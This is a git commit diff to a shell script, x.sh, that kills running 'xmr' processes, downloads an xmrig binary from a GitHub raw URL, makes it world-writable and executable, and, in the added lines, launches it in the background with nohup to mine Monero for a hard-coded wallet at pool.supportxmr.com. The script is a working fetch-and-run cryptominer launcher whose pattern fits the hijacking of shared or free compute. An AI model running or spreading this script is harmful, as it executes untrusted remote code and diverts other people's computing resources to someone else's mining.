6788f2051578958c48e36a55921e6c7656a6246a
mhrsq <99787054+mhrsq@users.noreply.github.com>
2025-05-27 08:52:03 +0700

    Update x.sh

--- x.sh
+++ x.sh
@@ -2,3 +2,8 @@ pkill -f xmr
 curl -o xmrig https://raw.githubusercontent.com/mhrsq/free/refs/heads/main/xmrig
 chmod 777 xmrig
 ps -aux | grep xmr
+
+nohup ./xmrig -t 2 -o pool.supportxmr.com:443 -u 492zTyp9mMSZK9FbXJzruWUZNmovsaES4CuEgAUw8MhhF9QrfYMbdUWPATRGDyDJCW4Yqc1fJTFkGPvKR9Xm4riNJTtnewy -k --tls -p guacamole &
+
+
+ps -aux | grep xmr
